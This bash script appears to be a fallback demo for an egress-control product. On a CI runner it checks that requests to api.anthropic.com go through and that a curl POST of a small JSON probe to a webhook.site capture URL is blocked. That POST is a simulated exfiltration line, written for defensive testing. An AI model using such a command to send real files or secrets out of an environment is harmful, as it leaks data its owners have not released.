#!/bin/bash
set -euo pipefail

# Fallback demo script — run DIRECTLY on the EC2 runner instance.
# SCP it there with:
#   scp -i ./infra/zenith-demo-key.pem scripts/demo-fallback.sh ec2-user@<IP>:/home/runner/
#   ssh -i ./infra/zenith-demo-key.pem ec2-user@<IP> 'bash /home/runner/demo-fallback.sh'
#
# Purpose: demonstrates ZTG egress control without going through GitHub Actions.
# Use this as a backup when the full Actions demo is unreliable on conference Wi-Fi.

WEBHOOK_URL="https://webhook.site/3e86fe7f-1b83-4643-a058-3212aa7831c9"
TIMEOUT_SECS=10

echo ""
echo "================================================================"
echo " FALLBACK DEMO: Direct egress test from runner"
echo " $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
echo "================================================================"
echo ""

# --- Test 1: Anthropic API reachability ---
echo "--- Test 1: Anthropic API (api.anthropic.com) ---"
echo "    Expected result: ALLOWED (ZTG policy permits the AI provider)"
echo ""

HTTP_CODE="$(curl -s -o /dev/null -w "%{http_code}" \
  --max-time "${TIMEOUT_SECS}" \
  https://api.anthropic.com 2>/dev/null)" || CURL_EXIT=$?

CURL_EXIT="${CURL_EXIT:-0}"

if [[ "$CURL_EXIT" -ne 0 ]]; then
  echo "    Anthropic API: BLOCKED (curl exit ${CURL_EXIT} — connection refused or timeout)"
  echo "    *** If ZTG is meant to allow Anthropic, check your allowlist. ***"
else
  case "$HTTP_CODE" in
    200|401|403|405)
      echo "    Anthropic API: ${HTTP_CODE} — ALLOWED"
      echo "    (TLS handshake succeeded; HTTP ${HTTP_CODE} confirms the server responded)"
      ;;
    000)
      echo "    Anthropic API: BLOCKED (HTTP 000 — connection dropped before response)"
      ;;
    *)
      echo "    Anthropic API: ${HTTP_CODE} — ALLOWED (unexpected code, but connection succeeded)"
      ;;
  esac
fi

echo ""

# --- Test 2: Webhook destination (should be blocked by ZTG) ---
echo "--- Test 2: Unsanctioned webhook (${WEBHOOK_URL}) ---"
echo "    Expected result: BLOCKED (ZTG policy denies this destination)"
echo ""

WEBHOOK_EXIT=0
WEBHOOK_HTTP="$(curl -s -o /dev/null -w "%{http_code}" \
  --max-time "${TIMEOUT_SECS}" \
  -X POST "${WEBHOOK_URL}" \
  -H "Content-Type: application/json" \
  -d '{"file":"src/example.py","review":"fallback-demo-probe"}' \
  2>/dev/null)" || WEBHOOK_EXIT=$?

if [[ "$WEBHOOK_EXIT" -ne 0 ]]; then
  echo "    Webhook: BLOCKED (curl exit ${WEBHOOK_EXIT} — ZTG is enforcing)"
  echo "    *** This is the expected outcome. ZTG prevented the review from being exfiltrated. ***"
else
  echo "    Webhook: ALLOWED (HTTP ${WEBHOOK_HTTP}) — WARNING: ZTG IS NOT ENFORCING"
  echo "    *** Check your ZTG policy. The destination should be on the denylist. ***"
fi

echo ""

# --- Audit log pointer ---
MY_IP="$(curl -s --max-time 5 https://ifconfig.me 2>/dev/null || echo 'unknown')"

echo "================================================================"
echo " Audit log"
echo "================================================================"
echo ""
echo " Open the ZTG console and filter egress logs by:"
echo "   Source IP: ${MY_IP}"
echo ""
echo " You should see:"
echo "   api.anthropic.com  → ALLOWED"
echo "   ${WEBHOOK_URL}  → BLOCKED"
echo ""
echo "================================================================"
echo " END OF FALLBACK DEMO"
echo "================================================================"
echo ""
